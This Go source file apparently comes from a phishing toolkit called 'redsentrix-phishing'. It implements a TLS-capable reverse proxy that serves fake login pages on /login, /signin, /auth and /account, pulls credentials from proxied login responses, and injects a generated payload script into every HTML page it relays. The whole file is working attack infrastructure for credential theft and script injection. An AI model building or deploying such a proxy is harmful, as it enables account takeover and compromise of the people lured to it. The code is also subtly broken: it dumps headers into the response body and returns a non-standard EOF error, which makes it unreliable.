package proxy

import (
	"fmt"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"
	"time"

	"redsentrix-phishing/sessions"
	"redsentrix-phishing/templates"
)

// ProxyServer handles reverse proxy for phishing
type ProxyServer struct {
	Port           int
	TargetURL      string
	SessionManager *sessions.Manager
	TemplateEngine *templates.Engine
	CertPath       string
	KeyPath        string
}

// NewProxyServer creates a new proxy server instance
func NewProxyServer(port int, targetURL string, certPath, keyPath string) *ProxyServer {
	return &ProxyServer{
		Port:           port,
		TargetURL:      targetURL,
		SessionManager: sessions.NewManager(),
		TemplateEngine: templates.NewEngine(),
		CertPath:       certPath,
		KeyPath:        keyPath,
	}
}

// Start begins the proxy server
func (p *ProxyServer) Start() error {
	target, err := url.Parse(p.TargetURL)
	if err != nil {
		return fmt.Errorf("invalid target URL: %v", err)
	}

	proxy := httputil.NewSingleHostReverseProxy(target)
	
	// Modify request
	originalDirector := proxy.Director
	proxy.Director = func(req *http.Request) {
		originalDirector(req)
		p.modifyRequest(req)
	}

	// Modify response
	proxy.ModifyResponse = p.modifyResponse

	// Error handling
	proxy.ErrorHandler = func(rw http.ResponseWriter, req *http.Request, err error) {
		log.Printf("Proxy error: %v", err)
		rw.WriteHeader(http.StatusBadGateway)
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		// Check if this is a phishing page request
		if p.isPhishingPage(r.URL.Path) {
			p.servePhishingPage(w, r)
			return
		}
		
		// Otherwise proxy the request
		proxy.ServeHTTP(w, r)
	})

	server := &http.Server{
		Addr:         fmt.Sprintf(":%d", p.Port),
		Handler:      mux,
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 15 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	// Use TLS if certificates are provided
	if p.CertPath != "" && p.KeyPath != "" {
		log.Printf("Starting HTTPS proxy on port %d", p.Port)
		return server.ListenAndServeTLS(p.CertPath, p.KeyPath)
	}

	log.Printf("Starting HTTP proxy on port %d", p.Port)
	return server.ListenAndServe()
}

// modifyRequest modifies outgoing requests
func (p *ProxyServer) modifyRequest(req *http.Request) {
	// Remove hop-by-hop headers
	req.Header.Del("Connection")
	req.Header.Del("Keep-Alive")
	req.Header.Del("Proxy-Authenticate")
	req.Header.Del("Proxy-Authorization")
	req.Header.Del("Te")
	req.Header.Del("Trailers")
	req.Header.Del("Transfer-Encoding")
	req.Header.Del("Upgrade")

	// Add custom headers
	req.Header.Set("X-Forwarded-For", req.RemoteAddr)
	req.Header.Set("X-Real-IP", req.RemoteAddr)
	
	// Log request
	p.SessionManager.LogRequest(req)
}

// modifyResponse modifies incoming responses
func (p *ProxyServer) modifyResponse(resp *http.Response) error {
	// Extract credentials from response if login page
	if p.isLoginPage(resp.Request.URL.Path) {
		p.extractCredentials(resp)
	}

	// Inject payload into HTML responses
	if strings.Contains(resp.Header.Get("Content-Type"), "text/html") {
		return p.injectPayload(resp)
	}

	return nil
}

// isPhishingPage checks if path should serve phishing page
func (p *ProxyServer) isPhishingPage(path string) bool {
	phishingPaths := []string{"/login", "/signin", "/auth", "/account"}
	for _, pp := range phishingPaths {
		if strings.Contains(path, pp) {
			return true
		}
	}
	return false
}

// isLoginPage checks if path is a login page
func (p *ProxyServer) isLoginPage(path string) bool {
	return p.isPhishingPage(path)
}

// servePhishingPage serves the phishing page with embedded payload
func (p *ProxyServer) servePhishingPage(w http.ResponseWriter, r *http.Request) {
	sessionID := p.SessionManager.CreateSession(r)
	
	// Generate phishing page with embedded payload
	page, err := p.TemplateEngine.RenderPhishingPage(r.URL.Path, sessionID)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/html")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(page))
}

// extractCredentials extracts credentials from response
func (p *ProxyServer) extractCredentials(resp *http.Response) {
	// Parse form data or JSON from response body
	// This would be implemented based on target site structure
	p.SessionManager.ExtractCredentials(resp)
}

// injectPayload injects payload into HTML response
func (p *ProxyServer) injectPayload(resp *http.Response) error {
	// Read response body
	body, err := httputil.DumpResponse(resp, true)
	if err != nil {
		return err
	}

	// Inject payload script
	payloadScript := p.TemplateEngine.GeneratePayloadScript()
	injectedBody := strings.Replace(string(body), "</body>", payloadScript+"</body>", 1)

	// Update response
	resp.Body.Close()
	resp.Body = &bodyReader{data: []byte(injectedBody)}
	resp.ContentLength = int64(len(injectedBody))
	resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(injectedBody)))

	return nil
}

// bodyReader implements io.ReadCloser for response body
type bodyReader struct {
	data []byte
	pos  int
}

func (br *bodyReader) Read(p []byte) (n int, err error) {
	if br.pos >= len(br.data) {
		return 0, fmt.Errorf("EOF")
	}
	n = copy(p, br.data[br.pos:])
	br.pos += n
	return n, nil
}

func (br *bodyReader) Close() error {
	return nil
}

